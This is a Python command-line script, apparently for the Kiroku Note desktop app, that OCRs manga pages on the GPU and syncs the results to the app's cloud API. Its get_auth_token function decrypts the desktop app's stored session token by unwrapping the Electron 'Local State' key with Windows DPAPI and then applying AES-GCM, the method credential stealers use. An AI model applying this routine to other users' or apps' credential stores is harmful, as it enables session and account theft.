"""
Kiroku Note — Canonical Manga Pre-Bake CLI Engine
Dual-Buffered Concurrent Architecture:
  Stage 1: Decompress + ComicTextDetector (DirectML ONNX on GPU)
  Stage 2: Batched MangaOcr (PyTorch CUDA on GPU) with max_new_tokens=64
  Stage 3: Background Cloud Sync to Turso / Cloudflare Worker (10-page batches)
"""
import os
import sys
import time
import json
import zipfile
import io
import queue
import threading
import urllib.request
from typing import List, Dict, Any

from PIL import Image
import torch

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

from manga_ocr import MangaOcr
from manga_ocr.ocr import post_process
from ocr_server.detector import ComicTextDetector


def get_auth_token() -> str:
    if os.environ.get('USER_TOKEN'):
        return os.environ['USER_TOKEN'].strip()

    cmd = [
        'python', '-c',
        '''
import os, json, base64, ctypes
from ctypes import wintypes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

local_state_path = os.path.expandvars(r'%APPDATA%\\kiroku-desktop\\Local State')
with open(local_state_path, 'r', encoding='utf-8') as f:
    local_state = json.load(f)
encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]

class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_byte))]
blob_in = DATA_BLOB(len(encrypted_key), ctypes.cast(ctypes.c_char_p(encrypted_key), ctypes.POINTER(ctypes.c_byte)))
blob_out = DATA_BLOB()
ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out))
master_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)

storage_path = os.path.expandvars(r'%LOCALAPPDATA%\\KirokuNote\\desktop-storage.json')
with open(storage_path, 'r', encoding='utf-8') as f:
    store = json.load(f)
enc_token = store['kiroku_auth_session']['token']
raw_payload = base64.b64decode(enc_token[4:])
nonce = raw_payload[3:15]
ciphertext = raw_payload[15:]
aesgcm = AESGCM(master_key)
token = aesgcm.decrypt(nonce, ciphertext, None).decode('utf-8')
print(token)
'''
    ]
    import subprocess
    return subprocess.check_output(cmd, text=True).strip()


def upload_batch_to_cloud(book_id: str, pages: List[Dict[str, Any]], token: str, retries: int = 3) -> bool:
    payload = json.dumps({'book_id': book_id, 'pages': pages}).encode('utf-8')
    url = 'https://kiroku-note.rhythmkach.workers.dev/api/user/manga/ocr/batch'
    for attempt in range(retries):
        try:
            req = urllib.request.Request(
                url,
                data=payload,
                headers={
                    'Authorization': f'Bearer {token}',
                    'Content-Type': 'application/json',
                    'User-Agent': 'Kiroku-Pipelined-GPU/2.0'
                },
                method='POST'
            )
            with urllib.request.urlopen(req, timeout=30) as resp:
                if resp.status == 200:
                    return True
        except Exception as e:
            if attempt == retries - 1:
                print(f"  [Cloud Upload Error] Batch failed: {e}")
                return False
            time.sleep(1.0)
    return False


def prebake_volume(
    cbz_filename: str,
    book_id: str,
    book_title: str,
    token: str = None
) -> Dict[str, Any]:
    if not token:
        token = get_auth_token()

    print("=" * 70)
    print(f"KIROKU GPU PRE-BAKE: {book_title}")
    print(f"Book ID: {book_id}")
    print("=" * 70)

    cbz_path = os.path.expandvars(rf'%APPDATA%\kiroku-desktop\File System\000\t\00\{cbz_filename}')
    if not os.path.exists(cbz_path):
        raise FileNotFoundError(f"CBZ file not found: {cbz_path}")

    # Initialize GPU engines
    print("Initializing MangaOcr on CUDA...")
    mocr = MangaOcr(force_cpu=False)
    cuda_device = str(next(mocr.model.parameters()).device)
    print(f"  MangaOcr active device: {cuda_device} (Torch CUDA: {torch.cuda.get_device_name(0)})")

    print("Initializing ComicTextDetector on DirectML GPU...")
    detector = ComicTextDetector(device="auto")
    detector._get_session()
    provider = detector.get_active_provider()
    print(f"  ComicTextDetector active ONNX provider: {provider}")

    zf = zipfile.ZipFile(cbz_path, 'r')
    img_names = sorted([n for n in zf.namelist() if n.lower().endswith(('.jpg', '.jpeg', '.png', '.webp'))])
    total_pages = len(img_names)
    print(f"Loaded volume archive: {total_pages} pages.")

    detection_queue = queue.Queue(maxsize=3)
    upload_queue = queue.Queue()
    producer_errors = []
    upload_errors = []

    # Stage 1: Detection Producer Thread
    def detection_producer():
        try:
            for idx, img_name in enumerate(img_names):
                p_num = idx + 1
                raw_bytes = zf.read(img_name)
                img = Image.open(io.BytesIO(raw_bytes)).convert('RGB')
                w, h = img.size

                raw_boxes = detector.detect(img, conf_threshold=0.35)

                crop_tensors = []
                box_metadata = []
                for b_info in raw_boxes:
                    box = b_info['box']
                    conf = b_info.get('confidence', 1.0)
                    bx1 = max(0, min(w - 1, int(box[0])))
                    by1 = max(0, min(h - 1, int(box[1])))
                    bx2 = max(bx1 + 1, min(w, int(box[2])))
                    by2 = max(by1 + 1, min(h, int(box[3])))
                    bw, bh = bx2 - bx1, by2 - by1
                    pad_x = round(min(bw * 0.08, 14))
                    pad_y = round(min(bh * 0.08, 14))

                    crop = img.crop((max(0, bx1 - pad_x), max(0, by1 - pad_y), min(w, bx2 + pad_x), min(h, by2 + pad_y)))
                    crop_l = crop.convert('L').convert('RGB')
                    crop_tensors.append(mocr._preprocess(crop_l))
                    box_metadata.append(([bx1, by1, bx2, by2], conf))

                detection_queue.put((p_num, (w, h), box_metadata, crop_tensors))
        except Exception as e:
            print(f"  [Producer Thread Error]: {e}")
            producer_errors.append(e)
        finally:
            detection_queue.put(None)

    # Stage 3: Background Cloud Upload Thread
    def cloud_uploader():
        while True:
            item = upload_queue.get()
            if item is None:
                break
            b_pages, b_id = item
            success = upload_batch_to_cloud(b_id, b_pages, token)
            if not success:
                upload_errors.append(len(b_pages))
            upload_queue.task_done()

    prod_thread = threading.Thread(target=detection_producer, daemon=True)
    up_thread = threading.Thread(target=cloud_uploader, daemon=True)

    start_time = time.time()
    prod_thread.start()
    up_thread.start()

    all_pages_data = []
    pending_batch = []
    total_bubbles_count = 0
    batch_size = 10

    # Stage 2: Recognition Consumer (Batched CUDA Tensor Generation with max_new_tokens=64)
    while True:
        item = detection_queue.get()
        if item is None:
            break

        p_num, (w, h), box_metadata, crop_tensors = item
        bubbles = []

        if crop_tensors:
            batch_tensor = torch.stack(crop_tensors).to(mocr.model.device)
            with torch.no_grad():
                outputs = mocr.model.generate(batch_tensor, max_new_tokens=64).cpu()

            for out_tensor, (box_coords, conf) in zip(outputs, box_metadata):
                raw_txt = mocr.tokenizer.decode(out_tensor, skip_special_tokens=True)
                text = post_process(raw_txt).strip()
                bubbles.append({
                    'box': box_coords,
                    'text': text,
                    'confidence': round(float(conf), 3),
                    'page_width': w,
                    'page_height': h
                })

        total_bubbles_count += len(bubbles)
        page_data = {
            'page_number': p_num,
            'page_width': w,
            'page_height': h,
            'bubbles': bubbles
        }
        all_pages_data.append(page_data)
        pending_batch.append(page_data)

        if len(pending_batch) >= batch_size or p_num == total_pages:
            upload_queue.put((list(pending_batch), book_id))
            pending_batch = []

        if p_num % 25 == 0 or p_num == total_pages:
            elapsed = time.time() - start_time
            avg_ms = (elapsed / p_num) * 1000
            print(f"  [{p_num:03d}/{total_pages:03d}] {p_num/total_pages*100:5.1f}% | "
                  f"Elapsed: {elapsed:5.1f}s | Avg: {avg_ms:.1f}ms/page | Bubbles so far: {total_bubbles_count}")

    prod_thread.join()
    zf.close()

    print("  Waiting for cloud upload queue to drain...")
    upload_queue.join()
    upload_queue.put(None)
    up_thread.join()

    total_elapsed = time.time() - start_time

    # Sort pages and write local JSON cache file
    all_pages_data.sort(key=lambda x: x['page_number'])
    cache_path = os.path.join(REPO_ROOT, '.tmp', f'kiroku_ocr_pages_{book_id}.json')
    with open(cache_path, 'w', encoding='utf-8') as f:
        json.dump(all_pages_data, f, ensure_ascii=False)
    print(f"Saved local JSON cache to {cache_path} ({os.path.getsize(cache_path)//1024} KB)")

    # Verify cloud pages in Turso
    verify_req = urllib.request.Request(
        f'https://kiroku-note.rhythmkach.workers.dev/api/user/manga/ocr/{book_id}',
        headers={'Authorization': f'Bearer {token}', 'User-Agent': 'Kiroku-Verify'}
    )
    cloud_pages_count = 0
    try:
        with urllib.request.urlopen(verify_req, timeout=30) as resp:
            v_data = json.loads(resp.read().decode('utf-8'))
            cloud_pages_count = len(v_data.get('pages', []))
    except Exception as e:
        print(f"Verification error: {e}")

    summary = {
        'book_title': book_title,
        'book_id': book_id,
        'mode': 'PIPELINED_DOUBLE_BUFFERED',
        'total_pages': total_pages,
        'total_bubbles': total_bubbles_count,
        'total_elapsed_sec': round(total_elapsed, 2),
        'avg_ms_per_page': round((total_elapsed / total_pages) * 1000, 1),
        'cloud_synced_pages': cloud_pages_count,
        'cache_size_kb': os.path.getsize(cache_path) // 1024,
        'gpu_device': cuda_device,
        'onnx_provider': provider
    }

    print("\n" + "-" * 50)
    print(f"COMPLETED: {book_title}")
    print(f"Total Time:      {summary['total_elapsed_sec']} seconds")
    print(f"Avg Speed:       {summary['avg_ms_per_page']} ms/page")
    print(f"Total Bubbles:   {summary['total_bubbles']}")
    print(f"Cloud Verified:  {summary['cloud_synced_pages']}/{total_pages} pages in Turso")
    print("-" * 50 + "\n")

    return summary


if __name__ == '__main__':
    # Default to Volume 4 test
    cbz = sys.argv[1] if len(sys.argv) > 1 else '00000037'
    bid = sys.argv[2] if len(sys.argv) > 2 else 'book_1794685754901_4na1ya'
    title = sys.argv[3] if len(sys.argv) > 3 else '004 [JP] Yotsubato'
    prebake_volume(cbz, bid, title)

